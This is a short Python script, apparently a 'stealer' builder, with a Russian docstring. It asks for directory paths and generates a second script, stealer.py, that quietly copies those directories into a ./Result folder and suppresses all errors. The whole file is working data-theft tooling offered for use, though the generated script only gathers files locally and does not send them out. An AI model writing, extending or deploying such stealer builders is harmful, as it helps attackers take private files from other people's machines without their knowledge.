""" simpleStealer.py -- создаёт `stealer.py`,
      который копирует указанные директории в `./Result` """
listTarget = []
counter = 0
print("[*] Write the 'exit' if you want break the cicle")
while True:
    select = input(f"{counter} Directory: ")
    if select != 'exit':
        listTarget.append(select)
        counter += 1
    else:
        break

with open("stealer.py", 'w') as stealer:
    stealer.write(f'''
from os import getcwd, mkdir
from os.path import basename
from shutil import copytree
directory = getcwd()+"/Result/"
try:mkdir(directory)
except FileExistsError:pass
listTarget = {listTarget}
for target in listTarget:
	under = directory + basename(target)
	try:copytree(target, under)
	except:pass
''')
    print("\u001b[33m[+] File 'stealer.py' created\u001b[0m")
